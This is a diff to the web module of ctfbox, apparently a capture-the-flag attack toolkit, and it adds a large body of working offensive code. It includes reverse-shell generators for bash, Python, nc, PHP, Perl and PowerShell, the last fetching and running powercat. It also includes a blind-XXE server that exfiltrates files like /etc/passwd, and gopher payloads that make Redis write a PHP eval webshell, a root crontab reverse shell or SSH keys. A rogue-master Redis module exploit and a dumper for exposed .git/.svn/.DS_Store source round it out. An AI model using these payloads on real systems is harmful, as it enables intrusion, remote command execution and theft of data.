@@ -1,21 +1,40 @@
-from math import ceil
+import os
+import sqlite3
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from enum import Enum
 from functools import partial
+from hashlib import md5 as _md5
+from hashlib import sha1 as _sha1
+from hashlib import sha256 as _sha256
+from hashlib import sha512 as _sha512
 from http.server import HTTPServer
 from itertools import chain
 from json import loads
-from threading import Thread
-from typing import Union, List, Tuple, Dict
-from urllib.parse import quote, quote_plus
-from hashlib import md5
+from math import ceil
+from os import path, remove
+from queue import Queue
+from re import match, sub, IGNORECASE
+from socket import AF_INET, SO_REUSEADDR, SOCK_STREAM, SOL_SOCKET, socket
+from tempfile import NamedTemporaryFile
+from threading import Lock, Thread
+from time import time
+from typing import Dict, List, Tuple, Union
+from urllib.parse import quote, quote_plus, urljoin, urlparse
+from zlib import decompress as zlib_decompress
 
 import requests
-from ctfbox.exceptions import (FlaskSessionHelperError, HashAuthArgumentError,
-                               ProvideArgumentError, GeneratePayloadError, HttprawError)
-from ctfbox.utils import random_string, Context, ProvideHandler, Threader
-from ctfbox.utils import md5 as _md5
-from ctfbox.utils import sha1, sha256, sha512
+import socketio
+from ctfbox.exceptions import (DumpError, SvnParseError, DSStoreParseError,
+                               FlaskSessionHelperError,
+                               GeneratePayloadError, HashAuthArgumentError,
+                               HttprawError, ProvideArgumentError, ScanError)
+from ctfbox.thirdparty.gin import GitParse
+from ctfbox.thirdparty.dsstore import DS_Store
 from ctfbox.thirdparty.phpserialize import serialize
+from ctfbox.thirdparty.reverse_mtrand import main as reverse_mt_rand_main
+from ctfbox.utils import (BlindXXEHandler, Context, ProvideHandler, Threader,
+                          random_string)
+from requests.sessions import Session
 
 
 class HashType(Enum):
@@ -25,13 +44,16 @@ class HashType(Enum):
     SHA512 = 3
 
 
+CRLF = "\r\n"
+
+
 filepath = str
 content = bytes
 routePath = str
 contentType = str
 
-HASHTYPE_DICT = {HashType.MD5: _md5, HashType.SHA1: sha1,
-                 HashType.SHA256: sha256, HashType.SHA512: sha512}
+HASHTYPE_DICT = {HashType.MD5: _md5, HashType.SHA1: _sha1,
+                 HashType.SHA256: _sha256, HashType.SHA512: _sha512}
 
 
 class SoapClient(object):
@@ -133,10 +155,10 @@ def get_flask_pin(username: str, absRootPath: str, macAddress: str, machineId: s
     """get flask debug pin code.
 
     Args:
-        username (str): username of flask
+        username (str): username of flask, try get it from /etc/passwd or /proc/self/environ
         absRootPath (str): project abs root path,from getattr(mod, '__file__', None)
         macAddress (str): mac address,from /sys/class/net/<eth0>/address
-        machineId (str): machine id,from /etc/machine-id
+        machineId (str): machine id,from /proc/self/cgroup first line with string behind /docker/ or /etc/machine-id or /proc/sys/kernel/random/boot_id
         modName (str, optional): mod name.  Defaults to "flask.app".
         appName (str, optional): app name, from getattr(app, '__name__', getattr(app.__class__, '__name__')). Defaults to "Flask".
 
@@ -159,7 +181,7 @@ def get_flask_pin(username: str, absRootPath: str, macAddress: str, machineId: s
         machineId,  # get_machine_id(), /etc/machine-id
     ]
 
-    h = md5()
+    h = _md5()
     for bit in chain(probably_public_bits, private_bits):
         if not bit:
             continue
@@ -284,7 +306,7 @@ def provide(host: str = "0.0.0.0", port: int = 2005, isasync: bool = False,
         raise ProvideArgumentError("files type must be list")
     handler = partial(ProvideHandler, files)
     server = HTTPServer((host, port), handler)
-    print(f"Listen on {host}: {port} ...")
+    print(f"Listen on {host}:{port} ...")
     if isasync:
         t = Thread(target=server.serve_forever)
         t.start()
@@ -356,18 +378,19 @@ def hashAuth(startIndex: int = 0, endIndex: int = 5, answer: str = "", maxRange:
     tasks = [run(context) for _ in range(threadNum)]
 
     for task in tasks:
-        if task.result == -1:
+        if task.result == -1 or not task.result:
             continue
-        pool = task.pool
-        pool.shutdown(wait=False)
-        return task.result
+        return str(task.result)
 
 
 def httpraw(raw: Union[bytes, str], **kwargs) -> Union[requests.Response, requests.Request]:
     """Send raw request by python-requests
 
+    Origin:
+        https://github.com/boy-hack/hack-requests
+
     Args:
-    raw(bytes/str): raw http request
+        raw(bytes/str): raw http request
     kwargs:
         proxies(dict) : requests proxies. Defaults to None.
         timeout(float): requests timeout. Defaults to 60.
@@ -385,7 +408,6 @@ def httpraw(raw: Union[bytes, str], **kwargs) -> Union[requests.Response, reques
     """
     if isinstance(raw, str):
         raw = raw.encode()
-    # ? Origin: https://github.com/boy-hack/hack-requests
     raw = raw.strip()
     send = kwargs.get("send", True)
     session = kwargs.get("session", None)
@@ -474,7 +496,7 @@ def httpraw(raw: Union[bytes, str], **kwargs) -> Union[requests.Response, reques
             headers["Content-Type"] = "application/json"
         if headers["Content-Type"] == "application/x-www-form-urlencoded":
             body = dict([l.split(b"=")
-                        for l in body.strip().split(b"&") if b"=" in l])
+                         for l in body.strip().split(b"&") if b"=" in l])
             body = {k.strip().decode(): v.strip().decode()
                     for k, v in body.items()}
         elif "multipart/form-data" in headers["Content-Type"]:
@@ -488,7 +510,8 @@ def httpraw(raw: Union[bytes, str], **kwargs) -> Union[requests.Response, reques
             raise HttprawError("Session invalid")
     else:
         session = requests.Session()
-    req = requests.Request(method, url, data=body, headers=headers, files=parse_dict["files"])
+    req = requests.Request(method, url, data=body,
+                           headers=headers, files=parse_dict["files"])
     prepped = req.prepare()
     if send:
         return session.send(prepped,
@@ -548,6 +571,43 @@ def gopherraw(raw: str, host: str = "", ssrfFlag: bool = True) -> str:
     if ssrfFlag:
         return quote(header + data)
     return header + data
+
+
+def php_serialize_escape(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
+    """Use for generate php unserialize escape attack payload, will decide to call l2s or s2l according to the length of src and dst
+
+    Args:
+        src (str): search string
+        dst (str): replace string, this length cannot be the same as src
+        payload (str):  the php serialize data you want to insert
+        paddingTrush (bool, optional): only for payload length error, it will try to padding trush in payload. Defaults to False.
+
+    Returns:
+        s2l:
+            dict:
+                insert_data: The payload that caused the data modification
+        l2s:
+            dict:
+                populoate_data: Data used to fill, causing characters to escape
+                trash_data: To fix the length error
+                insert_data: The payload that caused the data modification
+
+    Example:
+        php_serialize_escape("x", "yy", '''s:8:"password";s:6:"123456"''')
+        php_serialize_escape("yy", "x", '''s:8:"password";s:4:"test";s:4:"sign";s:6:"hacker"''')
+
+    Note:
+        s2l if length of src shorter than length of dst
+        s2l if length of src greater than length of dst
+    """
+    diff_len = len(dst) - len(src)
+    if diff_len > 0:
+        return php_serialize_escape_s2l(src, dst, payload, paddingTrush)
+    elif diff_len < 0:
+        return php_serialize_escape_l2s(src, dst, payload, paddingTrush)
+    else:
+        raise GeneratePayloadError(
+            "The length of dst cannot be the same as src")
 
 
 def php_serialize_escape_s2l(src: str, dst: str, payload: str, paddingTrush: bool = False) -> dict:
@@ -662,7 +722,7 @@ def soapclient_ssrf(url: str, user_agent: str = "Syclover", headers: Dict[str, s
         user_agent (str, optional): the user agent. Defaults to "Syclover".
         headers (Dict[str, str], optional): ohter headers. Defaults to {}.
         post_data (str, optional): the data you want to post. Defaults to "".
-        encode (bool, optional): whether to encode payload. Defaults to False.
+        encode (bool, optional): whether to encode payload. Defaults to True.
 
     Returns:
         Union[str, bytes]: generated payload
@@ -675,4 +735,815 @@ def soapclient_ssrf(url: str, user_agent: str = "Syclover", headers: Dict[str, s
         s = s.decode()
     except UnicodeDecodeError:
         pass
-    return quote_plus(s)
+    if encode:
+        return quote_plus(s)
+    else:
+        return s
+
+
+def scan(url: str, scanList: list = [], filepath: str = "", show: bool = True, timeout: int = 60, threadNum: int = 10) -> list:
+    """Scan for find existing network path
+
+    Args:
+        url (str): the host you want to scan
+        scanList (list, optional): the path list to scan. Defaults to [].
+        filepath (str, optional): the dictionary file path, it will be preferred. Defaults to "".
+        show (bool, optional): whether print result. Defaults to True.
+        timeout (int, optional): request timeout. Defaults to 60.
+        threadNum (int, optional): thread number. Defaults to 10.
+
+    Raises:
+        ScanError
+
+    Returns:
+        list: existing network path
+    """
+    url = url.strip()
+    it = None
+
+    if not match(r"^https?:/{2}\w.+$", url):
+        raise ScanError("Url invalid")
+
+    if filepath:
+        if path.exists(filepath):
+            it = open(filepath, 'r')
+        else:
+            raise ScanError("File path invalid")
+    else:
+        it = iter(scanList)
+    result = []
+
+    @Threader(threadNum)
+    def run(host):
+        while 1:
+            try:
+                url = urljoin(host, next(it).strip())
+            except StopIteration:
+                break
+            res = requests.head(url, timeout=timeout)
+            if 200 <= res.status_code < 400:
+                result.append((res.status_code, url))
+                if show:
+                    print(url)
+
+    tasks = [run(url) for _ in range(threadNum)]
+
+    for task in tasks:
+        _ = task.result
+
+    return result
+
+
+def bak_scan(url: str):
+    """A partial function of scan for backup file scanning
+
+
+    Args:
+        url (str): the host you want to scan
+
+    Returns:
+        list: existing network path
+
+    Note:
+        dictionary origin: https://github.com/kingkaki/ctf-wscan/blob/master/dict/default.txt
+    """
+    dict_path = path.join(path.split(path.realpath(__file__))[
+                          0], "../", "thirdparty", "dict", "bak.txt")
+
+    return scan(url, filepath=dict_path)
+
+
+def reshell(ip: str, port: Union[str, int], tp: str = "bash") -> str:
+    """Generate reverse shell command
+
+    Args:
+        ip (str): reverse host
+        port (Union[str, int]): reverse port
+        tp (str, optional): reverse type. Defaults to "bash".
+
+    AllowTypes:
+        bash
+        python/py
+        nc
+        php
+        perl
+        powershell/ps
+
+    Returns:
+        str: generated command
+    """
+
+    command = ""
+    if (tp == "bash"):
+        command = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
+    elif (tp == "py" or tp == "python"):
+        command = f"""python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"""
+    elif (tp == "nc"):
+        command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
+    elif (tp == "php"):
+        command = f"""php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'"""
+    elif (tp == "perl"):
+        command = """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'""" % (
+            ip, port)
+    elif (tp == "ps" or tp == "powershell"):
+        command = """powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c %s -p %s -e cmd'""" % (ip, port)
+    return command
+
+
+class OOB():
+    """An auxiliary class for oob, You can iterate it directly to get the data.
+
+    Args:
+        showDomain(bool, optional): whether to show domain. Defaults to True.
+        debug (bool, optional): whether debug mode is enabled. Default to False.
+
+    Returns:
+        iterable: An iterator that can be used to get data
+
+    Methods:
+        prepare(self, data) -> str  # prepare url which you can send with data
+
+    Note:
+        power by socket.io and dnslog.io
+
+    Example:
+        with OOB() as oob:
+            domain = oob.domain # get domain
+            requests.get(oob.prepare("test")) # send "test" and you will receive it
+            for data in oob:
+                print(data)
+
+    """
+
+    def __init__(self, showDomain: bool = True, debug: bool = False):
+        sio = socketio.Client()
+        self.sio = sio
+        self._queue = Queue()
+        self._debug = debug
+        self._unique = []
+        self._showDomain = showDomain
+        self._updateTime = time()
+        self._domainlock = Lock()
+        self._domainlock.acquire()
+
+        @sio.on("randomDomain")
+        def randomDomain(data):
+            domain = data["domain"]
+            self._showDomain and print('DnsLog domain:', domain)
+            self.domain = domain
+            self._domainlock.release()
+
+        @sio.on("dnslog")
+        def dnslog(data):
+            current_time = time()
+            if current_time - self._updateTime > 3.0:
+                del self._unique
+                self._unique = []
+                self._updateTime = current_time
+            message = data["dnslog"]
+            message = message.split(".")[0]
+            if message not in self._unique:
+                self._unique.append(message)
+                self._queue.put(message)
+
+        @sio.event
+        def connect():
+            self._debug and print("websocket connected")
+
+        @sio.event
+        def connect_error(data):
+            self._debug and print("websocket connection failed")
+
+        @sio.event
+        def disconnect():
+            self._debug and print("websocket disconnect")
+
+        sio.connect("https://dnslog.io/")
+
+    def __iter__(self):
+        return self
+
+    def __next__(self):
+        data = self._queue.get()
+        return data
+
+    def __getattribute__(self, name):
+        if name == "domain":
+            self._domainlock.acquire()
+            domain = object.__getattribute__(self, "domain")
+            self._domainlock.release()
+            return domain
+        return object.__getattribute__(self, name)
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, exc_type, exc_value, trace):
+        try:
+            self.sio.disconnect()
+        except Exception:
+            print("close socket.io failed")
+            return True
+
+    def prepare(self, data) -> str:
+        """prepare url which you can send with data
+
+        Args:
+            data (str): the data to send
+
+        Returns:
+            str: prepared url
+        """
+        return f"http://{data}.{self.domain}"
+
+
+def blindXXE(host: str = "0.0.0.0", port: int = 2021, isasync: bool = False):
+    """Build a server for blind xxe.
+    It will generate payload and wait for receive file contents.
+
+    Note:
+        read file payload like http://{host}:{port}/evil.dtd?[file=filepath you want to read][&bz2]:
+            argument file(optional): the path of the file you want to read. Defaults to "/etc/passwd".
+            argument bz2(optional): whether to use bz2 compress.
+        custom payload like http://{host}:{port}/custom.dtd?link=[any custom link]
+            arugment link: The link protocol can be any protocol supported by the victim server, this server will try to decode the received content with bz2 and base64
+
+    Args:
+        host (str, optional): host that the victim can access. Defaults to "0.0.0.0".
+        port (int, optional): listening port. Defaults to 2021.
+        isasync (bool, optional): Whether is async. Defaults to False.
+    """
+    content = f"""<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=!readFile!">
+<!ENTITY % hack "<!ENTITY &#x25; go SYSTEM 'http://{host}:{port}/?%payload;'>">
+%hack;""".encode()
+    bz2content = f"""<!ENTITY % payload SYSTEM "php://filter/bzip2.compress/convert.base64-encode/resource=!readFile!">
+<!ENTITY % hack "<!ENTITY &#x25; go SYSTEM 'http://{host}:{port}/?%payload;'>">
+%hack;""".encode()
+    customcontent = f"""<!ENTITY % payload SYSTEM "!link!">
+<!ENTITY % hack "<!ENTITY &#x25; go SYSTEM 'http://{host}:{port}/?%payload;'>">
+%hack;""".encode()
+
+    handler = partial(BlindXXEHandler, content, bz2content, customcontent)
+    server = HTTPServer(("0.0.0.0", port), handler)
+    print(f"Listen on 0.0.0.0:{port} ...\n")
+    print(f"""Read file payload:<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://{host}:{port}/evil.dtd?[file=filepath you want to read][&bz2]">
+%remote;
+%go;
+]>
+
+<root></root>
+
+Custom payload:
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://{host}:{port}/custom.dtd?link=[any custom link]">
+%remote;
+%go;
+]>
+
+<root></root>
+""")
+    if isasync:
+        t = Thread(target=server.serve_forever)
+        t.start()
+    else:
+        try:
+            server.serve_forever()
+        except KeyboardInterrupt:
+            print('[#] KeyboardInterrupt')
+            server.shutdown()
+
+
+def _redis_format(*redis_cmd):
+    if len(redis_cmd) == 0:
+        return ""
+
+    cmd = f"*{len(redis_cmd)}"
+    for line in redis_cmd:
+        cmd += f"{CRLF}${len(line)}{CRLF}{line}"
+    cmd += CRLF
+    return cmd
+
+
+def gopherredis_webshell(host: str, authPass: str = "", webFile: str = "/var/www/html/syc.php", content: str = "<?php eval($_REQUEST['syc']); ?>", urlEncoding: bool = False) -> str:
+    """generate gopher payload for attack redis to write webshell.
+
+    Args:
+        host (str): target redis host.
+        authPass (str, optional): redis auth pass. Defaults to "".
+        webFile (str, optional): file path you want to write. Defaults to "/var/www/html/syc.php".
+        content (str, optional): file content you want to write. Defaults to "<?php eval(['syc']); ?>".
+        urlEncoding (bool, optional): whether use url encoding payload. Defaults to False.
+
+    Returns:
+        str: generated payload
+    """
+    start = f"gopher://{host}/_"
+    origin = ""
+    payload = [
+        ["auth", f'{authPass}'] if authPass else [],
+        ["flushall"],
+        ["set", "1", f'{content}'],
+        ["config", "set", "dir", f'{path.dirname(webFile)}'],
+        ["config", "set", "dbfilename", f'{path.basename(webFile)}'],
+        ["save"]
+    ]
+    for line in payload:
+        origin += quote(_redis_format(*line))
+
+    if urlEncoding:
+        return quote(start + origin)
+
+    return start + origin
+
+
+def gopherredis_crontab(host: str, authPass: str = "", crontabFile: str = "/var/spool/cron/crontabs/root", reHost: str = "127.0.0.1:2020", urlEncoding: bool = False) -> str:
+    """generate gopher payload for attack redis to write crontab.
+
+    Args:
+        host (str): target redis host.
+        authPass (str, optional): redis auth pass. Defaults to "".
+        crontabFile (str, optional): file path you want to write. Defaults to "/var/spool/cron/crontabs/root".
+        reHost (str, optional): reverse shell host. Defaults to "127.0.0.1:2020".
+        urlEncoding (bool, optional): whether use url encoding payload. Defaults to False.
+
+    Returns:
+        str: generated payload
+    """
+    start = f"gopher://{host}/_"
+    origin = ""
+    payload = [
+        ["auth", f'{authPass}'] if authPass else [],
+        ["flushall"],
+        ["set", "1",
+            f'\n\n*/1 * * * * bash -i >& /dev/tcp/{reHost.replace(":", "/")} 0>&1\n\n'],
+        ["config", "set", "dir", f'{path.dirname(crontabFile)}'],
+        ["config", "set", "dbfilename", f'{path.basename(crontabFile)}'],
+        ["save"]
+    ]
+    for line in payload:
+        origin += quote(_redis_format(*line))
+
+    if urlEncoding:
+        return quote(start + origin)
+
+    return start + origin
+
+
+def gopherredis_ssh(host: str, authPass: str = "", sshFile: str = "/root/.ssh/authorized_keys", content: str = "", urlEncoding: bool = False) -> str:
+    """generate gopher payload for attack redis to write ssh authorized keys.
+
+    Args:
+        host (str): target redis host.
+        authPass (str, optional): redis auth pass. Defaults to "".
+        sshFile (str, optional): file path you want to write. Defaults to "/root/.ssh/authorized_keys".
+        content (str, optional): file content you want to write. Defaults to "127.0.0.1:2020".
+        urlEncoding (bool, optional): whether use url encoding payload. Defaults to False.
+
+    Returns:
+        str: generated payload
+    """
+    start = f"gopher://{host}/_"
+    origin = ""
+
+    payload = [
+        ["auth", f'{authPass}'] if authPass else [],
+        ["flushall"],
+        ["set", "1", f'\n\n{content}\n\n'],
+        ["config", "set", "dir", f'{path.dirname(sshFile)}'],
+        ["config", "set", "dbfilename", f'{path.basename(sshFile)}'],
+        ["save"]
+    ]
+
+    for line in payload:
+        origin += quote(_redis_format(*line))
+
+    if urlEncoding:
+        return quote(start + origin)
+
+    return start + origin
+
+
+def gopherredis_msr(host: str, masterHost: str = "127.0.0.1:2020", authPass: str = "",
+                    expFileName: str = "syc.so", expFilePath: str = "", command="id",  interactive: bool = False, urlEncoding: bool = False):
+    """generate gopher payload for attack redis by master-slave replication.This will be a series of processes, including output payload, listen server, etc.
+
+    Args:
+        host (str): target redis host.
+        masterHost (str, optional): listen host. Defaults to "127.0.0.1:2020".
+        authPass (str, optional): redis auth pass. Defaults to "".
+        expFileName (str, optional): exploit file name, you can custom it like *.so. Defaults to "syc.so".
+        expFilePath (str, optional): exploit file path, if not provided, use the default exp.so. Defaults to "".
+        command (str, optional): command you want to run. Defaults to "id".
+        interactive (bool, optional): Whether to enter the interactive mode, in the interactive mode enter command will automatically generate payload. Defaults to False.
+        urlEncoding (bool, optional): whether use url encoding payload. Defaults to False.
+    """
+
+    def formatOutput(content: str, urlEncoding: bool = False):
+        if urlEncoding:
+            return quote(content)
+        return content
+
+    def RogueServer(ip, port):
+        expfp = expFilePath or path.join(path.split(path.realpath(__file__))[
+            0], "../", "thirdparty", "redis", "exp.so")
+        with open(expfp, "rb") as f:
+            exp = f.read()
+
+        flag = True
+
+        s = socket(AF_INET, SOCK_STREAM)
+        s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+        s.bind((ip, port))
+        s.listen(10)
+        client, _ = s.accept()
+        while flag:
+            getData = client.recv(1024)
+            if b"PING" in getData:
+                client.send(b"+PING\r\n")
+                flag = True
+            elif b"REPLCONF" in getData:
+                client.send(b"+OK\r\n")
+                flag = True
+            elif b"PSYNC" in getData or b"SYNC" in getData:
+                client.send(b"+FULLRESYNC " + b"sycv5" * 8 + b" 1\r\n" + b"$" + str(
+                    len(exp)).encode() + b"\r\n" + exp + b"\r\n")
+                flag = False
+
+    start = f"gopher://{host}/_"
+    origin = ""
+
+    payload = [
+        ["auth", f'{authPass}'] if authPass else [],
+        ["flushall"],
+        ["slaveof", "no", "one"],
+        ["slaveof", masterHost.split(":")[0], masterHost.split(":")[-1]],
+        ["config", "set", "dbfilename", f'{path.basename(expFileName)}'],
+    ]
+
+    for line in payload:
+        origin += quote(_redis_format(*line))
+    print("--- Ready slave ---")
+    print(formatOutput(start + origin, urlEncoding))
+
+    print("--- Build server ---")
+    host_list = masterHost.split(":")
+    ip, port = host_list[0], host_list[1]
+    print(f"Listen on {host}:{port}... ")
+    RogueServer(ip=ip, port=int(port))
+
+    print("--- Load module ---")
+    origin = ""
+    payload = [
+        ["auth", f'{authPass}'] if authPass else [],
+        ["module", "load", f"./{expFileName}"]
+    ]
+    for line in payload:
+        origin += quote(_redis_format(*line))
+    print(formatOutput(start + origin, urlEncoding))
+
+    if not interactive:
+        origin = ""
+        payload = [
+            ["auth", f'{authPass}'] if authPass else [],
+            ["system.exec", f'{command}']
+        ]
+        for line in payload:
+            origin += quote(_redis_format(*line))
+
+        print(f"--- Command {command} ---")
+        print(formatOutput(start + origin, urlEncoding))
+    else:
+        try:
+            while interactive:
+                command = input("command:> ")
+                if command == "exit" or command == "quit":
+                    break
+                origin = ""
+                payload = [
+                    ["auth", f'{authPass}'] if authPass else [],
+                    ["system.exec", f'{command}']
+                ]
+                for line in payload:
+                    origin += quote(_redis_format(*line))
+
+                print(f"--- Command {command} ---")
+                print(formatOutput(start + origin, urlEncoding))
+        except KeyboardInterrupt:
+            print()
+            print("--- exit ---")
+        except Exception as e:
+            print(f"--- Error: {e} ---")
+
+
+class _BasicDumper(object):
+
+    def __init__(self, url: str, outdir: str, threadNum: int = 20):
+        self.url = url
+        self.outdir = outdir
+        self.targets = []
+        self.headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
+            "Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41"
+        }
+        self.threadNum = threadNum
+        self.lock = Lock()
+        self.session = Session()
+
+    def start(self):
+        self.dump()
+
+    def dump(self):
+        pass
+
+    def download(self, target: tuple):
+        url, filename = target
+
+        # 创建目标目录（filename可能包含部分目录）
+        fullname = os.path.join(self.outdir, filename)
+        outdir = os.path.dirname(fullname)
+        if outdir:
+            if not os.path.exists(outdir):
+                try:
+                    os.makedirs(outdir)
+                except FileExistsError:
+                    pass
+            elif os.path.isfile(outdir):
+                # 如果之前已经作为文件写入了，则需要删除
+                self.lock.acquire()
+                print(
+                    "Dump warning: %s is a file, it will be replace as a folder" % outdir)
+                self.lock.release()
+                os.remove(outdir)
+                os.makedirs(outdir)
+
+        # 获取数据
+        status, data = self.fetch(url)
+        if status != 200 or data is None:
+            # None才代表出错，data可能为b""
+            raise DumpError("Fetch file error: [%s] %s %s" % (
+                status, url, filename))
+        self.lock.acquire()
+        print("[+] %s" % (filename))
+        self.lock.release()
+
+        # 处理数据（如有必要）
+        data = self.convert(data)
+
+        # 保存数据
+        try:
+            with open(fullname, "wb") as f:
+                f.write(data)
+        except IsADirectoryError:
+            # 多协程/线程/进程下，属于正常情况
+            pass
+        except Exception as e:
+            self.lock.acquire()
+            print("Dump error: %s %s" % (url, filename))
+            print(str(e.args))
+            self.lock.release()
+
+    def convert(self, data: bytes) -> bytes:
+        """ 处理数据 """
+        return data
+
+    def fetch(self, url: str, times: int = 3) -> tuple:
+        """ 从URL获取内容，如果失败默认重试三次 """
+        # # TODO：下载大文件需要优化
+        s = self.session
+        while times:
+            try:
+                res = s.get(url, headers=self.headers)
+                ret = (res.status_code, res.content)
+                return ret
+            except Exception:
+                times -= 1
+        return (0, None)
+
+    def startPool(self):
+        with ThreadPoolExecutor(max_workers=self.threadNum) as pool:
+            tasks = [pool.submit(self.download, target)
+                     for target in self.targets]
+            for task in as_completed(tasks):
+                err = task.exception()
+                if err:
+                    if isinstance(err, DumpError):
+                        print("Dump error: %s" % err)
+                    else:
+                        raise err
+
+    def parse(self, url: str):
+        """ 从URL下载文件并解析 """
+        pass
+
+    def indexfile(self, url: str) -> NamedTemporaryFile:
+        """ 创建一个临时索引文件index/wc.db """
+        idxfile = NamedTemporaryFile(delete=False)
+        status, data = self.fetch(url)
+        if not data:
+            raise DumpError("Fetch index file error")
+        with open(idxfile.name, "wb") as f:
+            f.write(data)
+        return idxfile
+
+
+class _GitDumper(_BasicDumper):
+    def __init__(self, url: str, outdir: str, threadNum: int = 20):
+        super(_GitDumper, self).__init__(url, outdir, threadNum)
+        self.base_url = sub("\.git.*", ".git", url)
+
+    def start(self):
+        """ 入口方法 """
+        self.dump()
+
+    def dump(self):
+        try:
+            idxFile = self.indexfile(self.base_url + "/index")
+            for entry in GitParse(idxFile.name):
+                if "sha1" in entry.keys():
+                    sha1 = entry.get("sha1", "").strip()
+                    filename = entry.get("name", "").strip()
+                    if not sha1 or not filename:
+                        continue
+                    targetUrl = "%s/objects/%s/%s" % (
+                        self.base_url, sha1[:2], sha1[2:])
+                    self.targets.append((targetUrl, filename))
+            self.startPool()
+        finally:
+            if idxFile:
+                os.remove(idxFile.name)
+
+    def convert(self, data: bytes) -> bytes:
+        """ 用zlib对数据进行解压 """
+        if data:
+            try:
+                data = zlib_decompress(data)
+                # Bytes正则匹配
+                data = sub(rb"blob \d+\x00", b"", data)
+            except Exception as e:
+                print("Dump error: %s " % str(e.args))
+        return data
+
+
+class _SvnDumper(_BasicDumper):
+    def __init__(self, url: str, outdir: str, threadNum: int = 20):
+        super(_SvnDumper, self).__init__(url, outdir, threadNum)
+        self.base_url = sub("\.svn.*", ".svn", url)
+
+    def start(self):
+        """ dumper入口方法 """
+        entries_url = self.base_url + "/entries"
+        status, data = self.fetch(entries_url)
+        if not data:
+            raise SvnParseError("Fetch entries file error")
+        if data == b"12\n":
+            self.dump()
+        else:
+            # TODO: 针对svn1.7以前的版本
+            print("SVN version before 1.7, todo")
+            self.dump_legacy()
+
+    def dump(self):
+        try:
+            """ 针对svn1.7以后的版本 """
+            # 创建一个临时文件用来存储wc.db
+            idxFile = self.indexfile(self.base_url + "/wc.db")
+            # 从wc.db中解析URL和文件名
+            for item in self.parse(idxFile.name):
+                sha1, filename = item
+                if not sha1 or not filename:
+                    continue
+                url = "%s/pristine/%s/%s.svn-base" % (
+                    self.base_url, sha1[6:8], sha1[6:])
+                self.targets.append((url, filename))
+            idxFile.close()
+            self.startPool()
+        finally:
+            if idxFile:
+                os.remove(idxFile.name)
+
+    def dump_legacy(self):
+        """ 针对svn1.7以前的版本 """
+        pass
+
+    def parse(self, filename: str) -> list:
+        """ sqlite解析wc.db并返回一个(hash, name)组成列表 """
+        try:
+            conn = sqlite3.connect(filename)
+            cursor = conn.cursor()
+            cursor.execute("select checksum, local_relpath from NODES")
+            items = cursor.fetchall()
+            cursor.execute(
+                "select checksum, substr(md5_checksum,7) from PRISTINE")
+            items.extend(cursor.fetchall())
+            newitems = []
+            checksumList = []
+            for item in items:
+                if (item[0]) not in checksumList:
+                    checksumList.append(item[0])
+                    newitems.append(item)
+            conn.close()
+            return newitems
+        except Exception as e:
+            raise SvnParseError("Invalid .svn / Sqlite connection failed") from e
+
+
+class _DSStoreDumper(_BasicDumper):
+    def __init__(self, url: str, outdir: str, threadNum: int = 20):
+        super(_DSStoreDumper, self).__init__(url, outdir, threadNum)
+        self.base_url = sub("/\.DS_Store.*", "", url, flags=IGNORECASE)
+        self.url_queue = Queue()
+
+    def start(self):
+        self.url_queue.put(self.base_url)
+        self.parse_loop()
+        self.dump()
+
+    def dump(self):
+        self.startPool()
+
+    def parse_loop(self):
+        """ 从url_queue队列中读取URL，根据URL获取并解析DS_Store """
+        while not self.url_queue.empty():
+            base_url = self.url_queue.get()
+            status, ds_data = self.fetch(base_url + "/.DS_Store")
+            if status != 200 or not ds_data:
+                continue
+            try:
+                # 解析DS_Store
+                ds = DS_Store(ds_data)
+                sets = set(ds.traverse_root())
+                if not sets:
+                    raise DSStoreParseError("Empty .DS_Store")
+                for filename in sets:
+                    new_url = "%s/%s" % (base_url, filename)
+                    self.url_queue.put(new_url)
+                    # 从URL中获取path并删除最前面的/
+                    # 不删除/会导致path.join出错，从而导致创建文件失败
+                    fullname = urlparse(new_url).path.lstrip("/")
+                    self.targets.append((new_url, fullname))
+            except Exception as e:
+                # 如果解析失败则不是DS_Store文件
+                raise DSStoreParseError("Invalid .DS_Store") from e
+
+
+def leakdump(url: str, outputDir: str = "", threadNum: int = 20):
+    """A function for source code leaks, support .git .svn .DS_Store
+
+    Origin:
+        https://github.com/0xHJK/dumpall
+
+    Args:
+        url (str): the target url.
+        outputDir (str, optional): Output directory. Defaults to ./{hostname}.
+        threadNum (int, optional): thread number. Defaults to 20.
+
+    Raises:
+        DumpError
+
+    Example:
+        leakdump("http://example.com/.git")
+        leakdump("http://example.com/.svn")
+        leakdump("http://example.com/.DS_Store")
+    """
+
+    url = url.rstrip("/")
+    lower_url = url.lower()
+    if not outputDir:
+        parsed_url = urlparse(url)
+        outputDir = path.join("./", parsed_url.hostname)
+    availiable_endswith = [".git", ".svn", ".ds_store"]
+    if not any(ends for ends in availiable_endswith if lower_url.endswith(ends)):
+        raise DumpError("Not availiable url")
+
+    if lower_url.endswith(".git"):
+        dumper = _GitDumper(url, outputDir, threadNum)
+        dumper.start()
+
+    if lower_url.endswith(".svn"):
+        dumper = _SvnDumper(url, outputDir, threadNum)
+        dumper.start()
+
+    if lower_url.endswith(".ds_store"):
+        dumper = _DSStoreDumper(url, outputDir, threadNum)
+        dumper.start()
+
+
